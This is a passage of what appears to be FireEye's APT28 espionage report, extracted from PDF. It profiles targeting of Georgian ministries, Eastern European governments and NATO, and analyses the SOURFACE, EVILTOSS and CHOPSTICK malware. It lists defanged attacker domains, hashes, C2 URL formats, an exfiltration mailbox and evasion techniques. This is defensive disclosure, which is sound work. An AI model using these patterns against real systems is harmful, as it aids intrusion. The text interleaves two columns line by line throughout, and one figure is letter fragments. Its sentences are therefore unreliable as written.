Chechnya and other Russian republics and        Georgian that are probably intended to target
the independent states of Georgia ,              Georgian government agencies or citizens .
Armenia , and Azerbaijan , continues to experience        APT28 is likely seeking information on Georgia ’s
political unrest . The Georgian government ’s             security and diplomatic postures . Specifically ,
posture and ties to the West are a frequent             the group has targeted the Georgian Ministry of
source of Moscow ’s frustration , particularly after      Internal Affairs ( MIA ) and the Ministry of
the 2008 war . Overall , issues in the Caucasus           Defense ( MOD ) . We also observed efforts to
likely serve as focal points for Russian                target a journalist working on issues in the
intelligence collection efforts .                        Caucasus and a controversial Chechen news site .
7 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
Georgian Ministry of Internal Affairs ( MIA )
APT28 made at least two specific attempts to target
the Georgian Ministry of Internal Affairs .
APT28 Targeting of the Georgian                                                       license numbers . The backdoor attempted to
Ministry of Internal Affairs ( MIA )                                                    establish a connection to a Georgian MIA mail
The MIA harbors sensitive information about the                                       server and communicate via MIA email addresses
inner workings of Georgia ’s security operations , the                                  ending with “ @mia.ge.gov ” . Once connected to the
country ’s engagement in multilateral institutions ,                                    mail server , APT28 ’s backdoor sent an email
and the government ’s communications backbone . It                                      message using a subject line related to driver ’s
is responsible for3 :                                                                  licenses ( in Georgian ) , and attached a file
containing system reconnaissance information .
• 	        Policing , internal security , and border patrols                              This tactic could allow APT28 to obtain data from
• 	        Counterintelligence                                                          the MIA ’s network through a less - monitored
• 	        Counterterrorism                                                             route , limiting the MIA network security
• 	        International relations                                                      department ’s abilities to detect the traffic .
• 	        Defense of Georgia ’s strategic facilities
and assets                                                                   In the second example of MIA targeting , an APT28
• 	        “ Operative - Technical ” tasks                                                  lure used an information technology - themed decoy
document that included references to the Windows
APT28 made at least two specific attempts to                                          domain “ MIA Users\Ortachala … ” ( Figure 1 ) .
target the MIA . In one case , we identified an                                         This probably referred to the MIA facility in the
APT28 lure from mid-2013 that referenced                                              Ortachala district of Tbilisi , Georgia ’s capital city .
MIA - related topics and employed malware that                                          The decoy document also contains metadata listing
attempted to disguise its activity as legitimate                                      “ MIA ” as the company name and “ Beka Nozadze”4
MIA email traffic . The lure consisted of a                                            as an author , a possible reference to a system
weaponized Excel file that presented a decoy                                          administrator in Tbilisi . The text of the document
document containing a list of Georgian driver ’s                                       purports to provide domain and user group setup
3
Georgian Ministry of Internal Affairs website http://police.ge/en/home
4
Queries on the author yielded a LinkedIn page for a person of the same name who serves as a system administrator in Tbilisi .
8 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
information for internal Windows XP and Windows     training the Georgian military . APT28 used a lure
7 systems . APT28 possibly crafted this document     document that installed a SOURFACE downloader
to appear legitimate to all MIA system users and    ( further discussed in the Malware section ) and
intended to breach the MIA network specifically     contained a listing of birthdays for members of a
using the embedded malware .                         working group between the Georgian MOD and
the U.S. defense contractor . The U.S. contractor
APT28 Targeting of the Georgian                     was involved in a working group to advise the MOD
Ministry of Defense                                 and Georgian Armed Forces , assess Georgia ’s
APT28 also appeared to target Georgia ’s MOD         military capabilities , and develop a military training
along with a U.S. defense contractor that was       program for the country .
Figure 1 : Georgian MIA - related decoy
9 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
Figure 2 : Excerpt of APT28 ’s letter to a journalist writing on Caucasus - related issues
We wish our cooperation will be both profitable and trusted . Our aim in the Caucasian region is
to help people who struggle for their independence , liberty and human rights . We all know , that
world is often unfair and cruel , but all together we can make it better .
Send your articles on this email – in Russian or English , please . There are some difficulties with
Caucasian languages , but we ’ll solve the problem pretty soon , I hope .
Targeting journalists could provide APT28 and its sponsors
with a way to monitor public opinion , identify dissidents ,
spread disinformation , or facilitate further targeting .
We believe that APT28 ’s targeting of the MOD                                       APT28 Targeting a Journalist Covering
aligns with Russian threat perceptions . The                                        the Caucasus
growing U.S .- Georgian military relationship has                                    Another one of APT28 ’s lures appeared to target
been a source of angst for Russia . Georgia and                                     a specific journalist covering issues in the
Russia severed diplomatic relations following the                                  Caucasus region . In late 2013 , APT28 used a lure
Russia - Georgia War in 2008 , and Georgia has                                        that contained a letter addressing a journalist by
since sought to align itself more closely with                                     his first name and claiming to originate from a
western security organizations . Additionally , in                                   “ Chief Coordinator ” in Reason Magazine ’s
June 2014 , despite Russia ’s vocal objections ,                                      “ Caucasian Issues Department ” - a division that
Georgia , along with Ukraine and Moldova , signed                                    does not appear to exist.6 ( Reason Magazine is a
association accords with the EU.5 This move                                        US - based magazine ) The letter welcomed the
placed all three countries more firmly in the EU ’s                                 individual as a contributor and requested topic
political , economic , and security spheres of                                       ideas and identification information in order to
influence . Georgian military security issues ,                                      establish him at the magazine . In the background ,
particularly with regard to U.S. cooperation and                                   the decoy document installed a SOURFACE
NATO , provide a strong incentive for Russian                                       backdoor on the victim ’s system .
state - sponsored threat actors to steal information
that sheds light on these topics .
5
“ The EU ’s Association Agreements with Georgia , the Republic of Moldova and Ukraine ” . European Union Press Release Database . 23 June 2014 .
Web . http://e uropa.eu/rapid/press-release_MEMO-14-430_en.htm
6
We attempted to identify candidate journalists in the country . One of these was a Georgian national of Chechen descent , whose work appears to center on
Chechen and human rights issues . Ultimately , however , we can not confirm the identity of the target(s ) .
10 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
Table 1 : Examples of APT28 domains imitating organizations in the Caucasus
APT28 Domain                Real Domain
The Kavkaz Center / The Caucasus Center , an international Islamic news agency with coverage of
kavkazcentr[.]info
Islamic issues , particularly Russia and Chechnya ( kavkazcenter.com )
rnil[.]am                   Armenian military ( mil.am )
The body of the letter suggests that APT28 actors                                 APT28 ’s Other Targets in the Caucasus
are able to read at least two languages – Russian                                 We have seen APT28 register at least two
and English . The grammar of the letter also                                       domains mimicking the domains of legitimate
indicates that English is not the author ’s first                                  organizations in the Caucasus , as shown in the
language , despite it purportedly originating from a                               table below . One APT28 domain imitated a key
US - based magazine . This implies that Russian may                                  Chechen - focused news website , while the other
be the APT28 author ’s preferred language .                                         appeared to target members of the Armenian
military by hosting a fake login page .
Targeting journalists could provide APT28 and its
sponsors with a way to monitor public opinion ,                                    Of particular note , the Kavkaz Center is a
identify dissidents , spread disinformation , or                                    Chechen - run website designed to present an
facilitate further targeting . Several other nation                                alternative view to the long - running conflict
states are suspected of targeting journalists and                                 between Russia and Chechen separatists . In
dissidents to monitor their activity , including China                             200410 and 2013,11 Russia ’s Foreign Minister
and Iran.7,8 Journalists in the Caucasus working on                               voiced his displeasure that a Swedish company
Caucasus independence issues would be a prime                                     continues to host the Kavkaz Center website .
target for intelligence collection for Moscow .
Journalists critical of the Kremlin have long
been targets of surveillance and harassment ,
and a number of governments and human
rights organizations have publicly criticized the
government for its treatment of journalists and its
increasing consolidation of control over the media.9
7
Moran , Ned , Villeneuve , Nart , Haq , Thofique , and Scott , Mike . “ Operation Saffron Rose ” . FireEye . 13 May 2014 . Web . http://www.fireeye.com/blog/technical/
malware - research/2014/05/operation - saffron - rose.html
8
The New York Times publicly disclosed their breach by APT12 , which they assess was motivated by the China - based actors’ need to know what the
newspaper was publishing about a controversial topic related to corruption and the Chinese Communist Party ’s leadership .
9
“ Russia ” . Freedom House Press Release . 2013 . Web . http://www.freedomhouse.org/report/freedom-press/2013/russia#.VD8fe9R4rew
10
“ Chechen website promotes terror : Lavrov ” . UPI . 16 November 2014 . Web . http://www.upi.com / Top_News/2004/11/16/Chechen - website - promotes-
terror - Lavrov / UPI-11601100627922/
11
“ Lavrov urges Sweden to ban Chechen website server ” The Voice of Russia . 15 May 2013 . Web . http://voiceofrussia.com / news/2013_05_15/Lavrov - urges-
Sweden - to - ban - Chechen - website - server/
11 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
APT28 TARGETING OF
EASTERN EUROPEAN
GOVERNMENTS AND
MILITARIES
E
astern European countries’ political and
military postures are traditionally core Russian
Figure 3 : Decoy MH17                                                                                                government interests . The Kremlin has long
document probably sent
regarded the former Soviet Republics and satellite
to the Polish government
states as in its sphere of economic , political , and
military interest . Over the past two decades , as many
of these states joined NATO and the EU , Russia has
attempted to regain its influence in the region . Many
of APT28 ’s targets parallel this continued focus on
Eastern European governments and militaries .
APT28 Targets Eastern European
Government Organizations
We have evidence that APT28 made at least two
attempts to compromise Eastern European
government organizations :
• 	     In a late 2013 incident , a FireEye device
deployed at an Eastern European Ministry of
Foreign Affairs detected APT28 malware in
the client ’s network .
• 	     More recently , in August 2014 APT28 used a
lure ( Figure 3 ) about hostilities surrounding a
Malaysia Airlines flight downed in Ukraine in
a probable attempt to compromise the Polish
government . A SOURFACE sample employed
in the same Malaysia Airlines lure was
referenced by a Polish computer security
company in a blog post.12 The Polish security
company indicated that the sample was “ sent
to the government , ” presumably the Polish
government , given the company ’s location
and visibility .
12
“ MHT , MS12 - 27 Oraz * malware*.info ” Malware@Prevenity . 11 August 2014 . Web . http://malware.prevenity.com/2014/08/malware-info.html
12 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
Table 2 : Examples of APT28 domains imitating legitimate Eastern European organization names
APT28 Domain                                                    Real Domain
standartnevvs[.]com                                             Bulgarian Standart News website ( standartnews.com )
novinitie[.]com , n0vinite[.]com                                 Bulgarian Sofia News Agency website ( novinite.com )
qov[.]hu[.]com                                                  Hungarian government domain ( gov.hu )
q0v[.]pl , mail[.]q0v[.]pl                                       Polish government domain ( gov.pl ) and mail server domain ( mail.gov.pl )
poczta.mon[.]q0v[.]pl                                           Polish Ministry of Defense mail server domain ( poczta.mon.gov.pl )
We have evidence that APT28 made at least two attempts
to compromise Eastern European government
organizations .
APT28 has registered domains similar to those of                                    This domain registration suggests that APT28
legitimate Eastern European news sites and                                          sought to target individuals either participating in
governments , listed in Table 2 . These domain                                        the exercises or interested in Baltic military and
registrations not only suggest that APT28 is                                        security matters . Such targets would potentially
interested in Eastern European political affairs ,                                   provide APT28 with sensitive tactical and
but also that the group targets Eastern European                                    strategic intelligence concerning regional military
governments directly .                                                               capabilities and relationships . These exercises are
a particular point of interest in Moscow : pro-
In addition , APT28 used one domain for command                                      Kremlin press cited Russia ’s interpretation of
and control sessions ( baltichost[.]org ) that was                                    these military exercises and NATO ’s involvement
themed after the Baltic Host exercises . Baltic Host                                 as a “ sign of aggression , ” and Russia ’s Foreign
is a multinational logistics planning exercise , hosted                              Minister publicly stated that the exercise was “ a
annually since 2009 by one of the three Baltic                                      demonstration of hostile intention.”15
States ( Estonia , Latvia , and Lithuania , all three of
which are on Russia ’s border ) on a rotational basis .
In June 2014 , this event was integrated with a
larger U.S. Army training event , and focused on
exercises to improve interoperability with regional
allies and partners.13 , 14
13
“ Saber Strike and Baltic Host kick off in Latvia , Lithuania and Estonia’. Estonian Defense Forces . 9 June 2014 . Web . 11 June 2014 . http://www.mil.ee/en/
news/8251/saber - strike - and - baltic - host - kick - off - in - latvia ,- lithuania - and - estonia
14
“ Baltic Host 2014 rendering host nation support for the training audience of Exercise Saber Strike 2014 and repelling faked cyber - attacks ” . Republic of
Lithuania Ministry of National Defense . 12 June 2014 . Web . http://www.kam.lt/en/news_1098/current_issues/baltic_host_2014_rendering_host_nation_
support_for_the_training_audience_of_exercise_saber_strike_2014_and_repelling_faked_cyber - attacks.html
15
“ Tanks , troops , jets : NATO countries launch full - scale war games in Baltic ” . Russia Today . 9 June 2014 . Web . http://rt.com / news/164772-saber - strike-
exercise - nato/
13 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
APT28 TARGETING OF
NATO AND OTHER
EUROPEAN SECURITY
ORGANIZATIONS
A
PT28 ’s lures and domain registrations also                                  elections . Insider information about NATO , the
demonstrate their interest in NATO and                                      OSCE and other security organizations would
other European security organizations .                                      inform Russian political and military policy .
NATO remains a chief Russian adversary , or in the
words of Russia ’s 2010 military doctrine , a “ main                                    Several of the domains APT28 registered imitated
external military danger ” particularly as it moves                                   NATO domain names , including those of NATO
“ closer to the borders of the Russian Federation.”16                                 Special Operations Headquarters and the NATO
As the traditional western counterweight to the                                      Future Forces Exhibition . We also observed a user
Soviet Union , Russia regards NATO , particularly                                      that we suspect works for NATO HQ submit an
NATO ’s eastward expansion , as a threat to Russia ’s                                   APT28 sample to VirusTotal , probably as a result
strategic stability . APT28 also registered a domain                                  of receiving a suspicious email .
name imitating the Organization for Security
and Cooperation in Europe ( OSCE ) , an
intergovernmental organization that has cited
widespread fraud in numerous Russian state
Table 3 : Examples of APT28 domains imitating legitimate NATO and security websites
APT28 Domain                                    Real Domain
nato.nshq[.]in                                  NATO Special Operations Headquarters ( nshq.nato.int )
natoexhibitionff14[.]com                        NATO Future Forces 2014 Exhibition & Conference ( natoexhibition.org )
login - osce[.]org                                Organization for Security and Cooperation in Europe ( osce.org )
16
The Military Doctrine of the Russian Federation , approved by Presidential edict on 5 February 2010 .
14 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
APT28 also demonstrated an interest in defense
attaches working in European countries . We identified
an APT28 lure containing a decoy document with a list
of British officers and U.S. and Canadian military
attachés in London .
Figure 4 : Decoy
document used
against military
attaches in 2012
Finally , APT28 used a lure that contained an apparent
non - public listing of contact information for defense
attachés in the “ Ankara Military Attaché Corps ( AMAC ) , ”
which appears to be a professional organization of
defense attachés in Turkey .
Figure 5 : Ankara
Military Attache Corps
decoy document
15 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
APT28 Targets European                                 SMi Group , a company that plans events for the
Defense Exhibitions                                    “ Defence , Security , Energy , Utilities , Finance and
In addition to targeting European security             Pharmaceutical sectors . ” Among other events , the
organizations and governments , it appears that         SMi Group is currently planning a military satellite
APT28 is targeting attendees of European               communications event for November 2014 .
defense exhibitions . Some of the APT28-
registered domains imitated those of defense           Targeting organizations and professionals
events held in Europe , such as the Farnborough         involved in these defense events would likely
Airshow 2014 , EuroNaval 2014 , EUROSATORY               provide APT28 with an opportunity to procure
2014 , and the Counter Terror Expo . In September        intelligence pertaining to new defense
2014 , APT28 registered a domain ( smigroup-             technologies , as well as the victim organizations’
online.co[.]uk ) that appeared to mimic that for the    operations , communications , and future plans .
Targeting organizations and
professionals involved in
these defense events would
likely provide APT28 with an
opportunity to procure
intelligence pertaining to
new defense technologies .
16 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
OTHER APT28 TARGETS
ARE CONSISTENT
WITH NATION STATE
INTERESTS
A
PT28 has targeted a variety of organizations
INTERNATIONAL ORGANIZATION
that fall outside of the three themes we
highlighted above . However , we are not
profiling all of APT28 ’s targets with the same                European Commission
detail because they are not particularly indicative
of a specific sponsor ’s interests . They do indicate           UN Office for the Coordination of Humanitarian Affairs
parallel areas of interest to many governments
and do not run counter to Russian state interests .
APEC
Other probable APT28 targets that we have
identified :                                                   NATO
• 	    Norwegian Army ( Forsvaret )
OSCE
• 	    Government of Mexico
• 	    Chilean Military
• 	    Pakistani Navy                                           World Bank
• 	    U.S. Defense Contractors
• 	    European Embassy in Iraq
• 	    Special Operations Forces Exhibition ( SOFEX )
OTHER
in Jordan
• 	    Defense Attaches in East Asia
• 	    Asia - Pacific Economic Cooperation ( APEC )                 Hizb ut - Tahir
• 	    Al - Wayi News Site
Chechnya Global
KEY
APT28 Registered Domains
Diplomatic Forum
Lure Document
Military Trade Shows
Phishing Email
17 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
HUNGARIAN GO
IVERSITY
NOR
T
MEN
UK
ER
WEG
DE
ERN
NT
UN
FEN
FA
IAN M
CE
GOV
M
CROATIAN
S
AZ
KI
EA
BE
VERNME
ILITA
VK
ISH
Y
TTA
UZ
AR
KA
POL
IT
RY
CH
IL
M
ES
N
NT
NT
IA
ME
EN
N
M
ER
AR
V
GO
N
GIA
LE
OR                                  TIC
GE                              S      AR
EW
CAN                                                                                                                                                                             TN
ADI
AN                                                                                                                                                        P      RIO
DEF                                                                                                                                               CY
ENS
E AT
TAC
HES
JAPAN
TACHES IN
DEFENSE AT
US DEFENSE ATTACHES AND US DEFENSE CONTRACTORS
DEFENSE ATTA
CHES IN SOUTH
KOREA
DEFE
NMENT                                                                                                                                             NSE A
AN    GOVER                                                                                                                                                             TTAC
MEXIC                                                                                                                                                                                            HES IN
CHIN
A
EU            EM
RO              IRA
PE            TI
NE
AN                   WS
EM                     WE
BA                      BS
IR                   SS                   ITE
AN                     Y
DE
IA                     IN
N                       IR
FE
AQ
AF
AC
PA
Y
BUL
O ( MFA )
AR
NS
AD
GH
K AS
IT
EM
EA
GAR
AN
IL
TA
IC
M
TTA
IN
N
S
AN
IM
IAN
ICAN DIRC
EW
CH
LE
IL
IT
S
I
NEW
CH
ES
AR
W
Y
EB
IN
UGANDA
SW
SI
TU
TE
SOUTH AFR
RK
EBS
EY
ITES
N NGO
KEY
APT28 Registered Domains
Lure Document
Phishing Email
18 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
Our analysis of some of the group ’s more
commonly used tools indicates that APT28
has been systematically updating their
malware since 2007 .
APT28 MALWARE INDICATES
SKILLED RUSSIAN
DEVELOPERS
A
PT28 ’s tools are suggestive of the group ’s       • 	    SOURFACE : This downloader is typically
skills , ambitions , and identity . Our analysis         called Sofacy within the cyber security
of some of the group ’s more commonly                  community . However because we have
used tools indicates that APT28 has been                      observed the name “ Sofacy ” used to refer to
systematically updating their tools since 2007 .               APT28 malware generally ( to include the
APT28 is most likely supported by a group of                  SOURFACE dropper , EVILTOSS ,
developers creating tools intended for long - term              CHOPSTICK , and the credential harvester
use and versatility , who make an effort to                    OLDBAIT ) , we are using the name
obfuscate their activity . This suggests that APT28            SOURFACE to precisely refer to a specific
receives direct ongoing financial and other                   downloader . This downloader obtains a
resources from a well - established organization ,               second - stage backdoor from a C2 server .
most likely a nation state government . APT28 ’s                CORESHELL is an updated version of
malware settings suggest that the developers                  SOURFACE .
have done the majority of their work in a Russian        • 	    EVILTOSS : This backdoor has been delivered
language build environment during Russian                     through the SOURFACE downloader to gain
business hours , which suggests that the Russian               system access for reconnaissance ,
government is APT28 ’s sponsor .                                monitoring , credential theft , and shellcode
execution .
Some of APT28 ’s more commonly used tools are             • 	    CHOPSTICK : This is a modular implant
the SOURFACE downloader , its second stage                     compiled from a software framework that
backdoor EVILTOSS , and a modular family of                    provides tailored functionality and flexibility .
implants that we call CHOPSTICK .
19 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
A number of the malware variants that we profile      • 	    One of the latest samples of CORESHELL
below , especially the CHOPSTICK family ,                    includes counter - reverse engineering tactics
demonstrate formal coding practices indicative of          via unused machine instructions . This would
methodical , diligent programmers . The modularity           hinder static analysis of CORESHELL behavior
of CHOPSTICK alone , with its flexible and lasting          by creating a large amount of unnecessary
platform , demonstrates planning for long - term              noise in the disassembly .
use and versatility . We have also noted that          • 	    A number of CORESHELL droppers also
APT28 tailors implants to their target                     conduct runtime checks , attempting to
environments , configuring them to use local                determine if they are executing in an analysis
network resources such as email servers .                   environment , and if so , they do not trigger
their payloads .
APT28 has attempted to obfuscate their code and       • 	    Many samples across the SOURFACE/
implement counter - analysis techniques :                     CORESHELL , CHOPSTICK , and EVILTOSS
Figure 6 : Typical deployment of SOURFACE ecosystem
Spearphishing Email
Document with exploit
Dropper malware
SOURFACE downloader                                       Obtains 2nd stage               C2 Server
Deploys 2nd stage droppers
2nd stage implant
20 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
malware families obfuscate strings that are        APT28 has made incremental and systematic
decoded at runtime . Two of the malware             changes to the SOURFACE downloader and its
families ( SOURFACE / CORESHELL and                   surrounding ecosystem since as early as 2007 .
EVILTOSS ) use the same decryption                  These changes indicate a long - standing and
sequence and similar algorithms for string         dedicated development effort behind APT28 . We
encoding and decoding . These families              have observed samples of the SOURFACE
encode their strings at compile time using a       downloader compiled between 2007 and 2014 .
custom stream cipher . From a high level ,           We call SOURFACE ( samples are frequently
these ciphers share a similar design across        named netids.dll ) a first stage downloader
the malware families but differ slightly in the    because its primary job is to retrieve a second
internal arithmetic operations .                    stage payload from a C2 server . Until 2013 , the
• 	     APT28 has employed RSA encryption to               SOURFACE downloader used hard - coded IP
protect files and stolen information moved         addresses for C2 communications , whereas the
from the victim ’s network to the controller .       future CORESHELL samples use domains .
EVOLUTION OF
SOURFACE ECOSYSTEM
INDICATES SYSTEMATIC DEVELOPMENT
WHAT IS A MALWARE ECOSYSTEM ?
First , a malware family is a collection of malware in which each sample shares a significant
amount of code with all of the others . There are exceptions : for example , some files
contain public and standard code libraries that we do not take into consideration
when making a family determination .
A malware ecosystem is a group of malware families that work together to perform
the same objective . Perhaps the simplest and most typical ecosystem
is a dropper and a backdoor that are used together . They may not share the
same code structure , but they are related because one drops and installs
the other .
The ecosystem surrounding the SOURFACE downloader frequently
consists of a dropper , which installs SOURFACE . The SOURFACE
downloader then receives another dropper from its C2 server , and
this second dropper installs a second stage backdoor , which is
usually EVILTOSS .
21 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
In April 2013 , based on compile time , the group
began to make significant alterations to the                                  Figure 7 : Example of modified SOURFACE vs. CORESHELL communications
SOURFACE downloader . They started by
changing the compiled DLL name to “ coreshell.dll ”
and making minor changes to the network
communications , as seen in Figure 7 .                                          SOURFACE URL for a sample compiled April 2013 :
http://[hostname]/~book / cgi - bin / brvc.cgi?WINXPSP3c95b87a4 - 05_01
The hostname , volume serial number and OS
version data are encoded in the new URL format .                               CORESHELL URL for a sample compiled April 2013 :
As seen in the table below , the SOURFACE/                                     http://[hostname]/~xh / ch.cgi?enhkZm1GNmY1YWg0eGcxMGQ1MDUwMQ==
CORESHELL developers also made other
modifications that changed the exported function
name and file size over time .
Table 4 : Evolution of SOURFACE downloader over time
MD5                                                         Size              Compile Date                                         Export Name                     Notes
272f0fde35dbdfccbca1e33373b3570d                            11264             2013 - 04 - 16 10:49:25 UTC                              Init1                           17
8b92fe86c5b7a9e34f433a6fbac8bc3a                            14848             2013 - 08 - 06 07:53:03 UTC                              Initialize                      18
9eebfebe3987fec3c395594dc57a0c4c                            12800             2013 - 08 - 14 10:48:59 UTC                              Initialize                      19
da2a657dc69d7320f2ffc87013f257ad                            12800             2013 - 08 - 21 07:52:10 UTC                              Initialize                      Same as previous .
1259c4fe5efd9bf07fc4c78466f2dd09                            12800             2013 - 10 - 03 09:21:10 UTC                              Initialize                      Same as previous .
3b0ecd011500f61237c205834db0e13a                            43520             2014 - 02 - 13 16:29:36 UTC                              Applicate                       20
5882fda97fdf78b47081cc4105d44f7c                            45056             2014 - 05 - 13 15:18:24 UTC                              Applicate                       21
791428601ad12b9230b9ace4f2138713                            45056             2014 - 05 - 13 16:42:26 UTC                              Applicate                       Same as previous .
ead4ec18ebce6890d20757bb9f5285b1                            45056             2014 - 07 - 25 15:44:04 UTC                              Applicate                       Same as previous .
48656a93f9ba39410763a2196aabc67f                            112640            2014 - 07 - 30 11:13:24 UTC                              Applicate                       22
8c4fa713c5e2b009114adda758adc445                            112640            2014 - 07 - 30 11:13:24 UTC                              Applicate                       Same as previous .
17
SOURFACE with minor changes to network communications ( see Figure 7 ) .
18
Basic anti - debug measures added ( process listing , rand timing , is DebuggerPresent ) .
19
Switches from loading a secondary DLL ( netui.dll/WinIDS.dll ) to uploading the contents of % temp%\chkdbg.log .
20
Statically links msvcrt library .
21
Statically links msvcrt library and the strings used to identify the imported libraries and functions are reversed prior to being used , then reversed back after use .
22
This version added assembly level obfuscation , which slows down analysis . This variant requires the OS to be at least Windows Vista .
22 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
In April 2013 , based on compile time , the
group began to make significant alterations to
the SOURFACE downloader .
Figure 8 : NATO - themed decoy
delivered with possible EVILTOSS
predecessor from 2004
Variants of the SOURFACE second stage                                                 Interestingly , we found an antivirus report from
backdoor , EVILTOSS , share some code similarities                                      200423 detailing what appears to be an early
with SOURFACE . However , it contains more                                              variant of EVILTOSS . The backdoor was installed
capabilities , including the ability to provide access                                 alongside the NATO - themed decoy document
to the file system and registry , enumerate network                                    depicted in Figure 8 . The backdoor sent data via
resources , create processes , log keystrokes , access                                   SMTP to nato_smtp@mail[.]ru and received its
stored credentials , and execute shellcode . The                                        tasking via POP from nato_pop@mail[.]ru .
backdoor encrypts data that it uploads with an RSA                                    Although we have not conclusively attributed
public key . Many of its variants we have seen are                                     this sample to APT28 , it does suggest the
named netui.dll . EVILTOSS variants may use the                                        possibility that APT28 has been operating since
Simple Mail Transfer Protocol ( SMTP ) to send                                          as early as 2004.24
stolen data in an attachment named “ detaluri .
dat ” . The backdoor attaches this file to a
preformatted email and sends it out through a
victim ’s mail server .
23
http://ae.norton.com/security_response/print_writeup.jsp?docid=2004-081915-1004-99
24
Although the malware family and interest in NATO make it likely that APT28 was involved , we can not conclusively attribute this sample to APT28 based on
these factors alone . We have no evidence that they controlled the C2 for this malware or were using EVILTOSS in 2004 . APT28 could have possibly obtained
this source code from another group of actors . Also , malware can be passed from group to group . The other malware that we associate with APT28 in this
paper is more strongly attributed to the group using additional factors , some of which we mention in Appendix A.
23 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
MODULAR IMPLANTS
INDICATE A FORMAL
DEVELOPMENT
ENVIRONMENT
A modular development framework                                                     CHOPSTICK variants may move messages and
information using at least three methods :
suggests the group has had an organized
development effort since as early as 2007 .                                          1 . 	    Communications with a C2 server using
HTTP . These protocols are covered in more
detail in Appendix D.
2 . 	    Email sent through a specified mail server .
One CHOPSTICK v1 variant contained
D
uring our research , we discovered that              modules and functions for collecting
APT28 uses a backdoor developed using a             keystroke logs , Microsoft Office documents ,
modular framework . We call this                     and PGP files . The monitoring for new files of
backdoor CHOPSTICK , a somewhat ironic name                   interest is performed by a “ Directory
that comes from our semi - random name                         Observer ” module . In one sample this
generator . The modular design allows flexible                information was intended to be sent via
options for compiling variants with different                SMTP using a Georgian MIA mail server . It
capabilities as needed , as well as deploying                 used one of four embedded sender email
additional capabilities at runtime . This allows the          addresses ( @mia.gov.ge ) to send files via
developers to make targeted implants , including              email to another email address on the same
only the capabilities and protocols necessary for a          mail server . All information required for the
specific environment . Such a modular framework               email was hardcoded in the backdoor .
suggests the group has had an organized                3 . 	    Local copying to defeat closed networks .
development effort since as early as 2007 . A                 One variant of CHOPSTICK focuses on
formal development environment , in which code is             apparent air gap / closed network capabilities
versioned and well - organized , would almost                   by routing messages between local
certainly be required to track and define the                directories , the registry and USB drives .
various modules that can be included in the
backdoor at compile time .
24 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
APT28 MALWARE
INDICATES RUSSIAN
SPEAKERS IN A
RUSSIAN TIME ZONE
D
uring our research into APT28 ’s malware ,                             interface items in a specific language.25 Non - default
we noted two details consistent across                               language settings packaged with PE resources are
malware samples . The first was that                                  dependent on the developer ’s build environment .
APT28 had consistently compiled Russian language                              Each PE resource includes a “ locale ” identifier with
settings into their malware . The second was that                              a language ID “ composed of a primary language
malware compile times from 2007 to 2014                                       identifier indicating the language and a sublanguage
corresponded to normal business hours in the UTC                              identifier indicating the country / region.”26
+ 4 time zone , which includes major Russian cities
such as Moscow and St. Petersburg .                                            At the time of the writing of this paper , we had
identified 103 malware samples that were both
Use of Russian and English Language                                           attributed to APT28 and contained PE resources .
Settings in PE Resources                                                      Table 5 shows the locale identifiers27 with
PE resources include language information that                                associated language and country / region for
can be helpful if a developer wants to show user                              these samples .
Table 5 : Locale and language identifiers associated with APT28 malware
Number of APT28
Locale ID 	                Primary language                                                             Country / Region
samples
0x0419                    Russian ( ru )                                                                 Russia ( RU )                                   59
0x0409                    English ( en )                                                                 United States ( US )                            27
0x0000 or 0x0800          Neutral locale / System default locale language                              Neutral                                       16
English ( en )                                                                 United Kingdom ( GB )                           1
0x0809
25
Microsoft Developer Network – Multiple Language Resources http://msdn.microsoft.com/en-us/library/cc194810.aspx
Microsoft Developer Network – Language Identifier Constants and Strings http://msdn.microsoft.com/en-us/library/dd318693.aspx
26 , 27
25 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
The samples with Russian language settings were            with Russian language settings at least some of
compiled between late 2007 and late 2013 , as               the time and made no effort to obscure this
depicted in Figure 9 . This consistency over a              detail . Overall , the locale IDs suggest that
long timeframe suggests that the developers of             APT28 developers can operate in both Russian
APT28 malware were using a build environment               and English .
Figure 9 : Number of APT28 samples with Russian language settings by compile month
2007               December
2008               March
May
August
2009               February
May
September
2010               February
March
August
September
October
November
December
2011               April
June
September
December
2012               April
May
June
July
October
December
2013               January
July
August
October
November
December
0 	         1 	         2 	        3 	         4 	          5 	         6 	        7 	         8 	        9
26 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
Compile Times Align with Working
Hours in Moscow and St. Petersburg
Of the 140 malware samples that we have
attributed to APT28 so far , over 89% were
compiled between 0400 and 1400 UTC time , as
depicted in Figure 10 . Over 96% were compiled
between Monday and Friday . This parallels the
working hours in UTC+0400 ( that is , compile
times begin about 8AM and end about 6PM in this
time zone ) . This time zone includes major Russian
cities such as Moscow and St. Petersburg .
13:00                   14:00               15:00               16:00
Figure 10 : Compile Times of APT28 malware in UTC Time
20
18
Moscow business hours
16
14
FREQUENCY
12
10
8
6
4
2
0    1 	    2    3 	    4    5    6     7      8     9    10     11      12    13    14      15     16    17    18    19    20    21    22       23    24
TIME OF DAY ( UTC )
27 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
CONCLUSION
We started researching APT28 based on activity                APT28 ’s characteristics — their targeting , malware ,
we observed on our clients’ networks , similar to              language , and working hours — have led us to
other targeted threat groups we have identified               conclude that we are tracking a focused , long-
over time . We assess that APT28 is most likely                standing espionage effort . Given the available
sponsored by the Russian government . We                       data , we assess that APT28 ’s work is sponsored
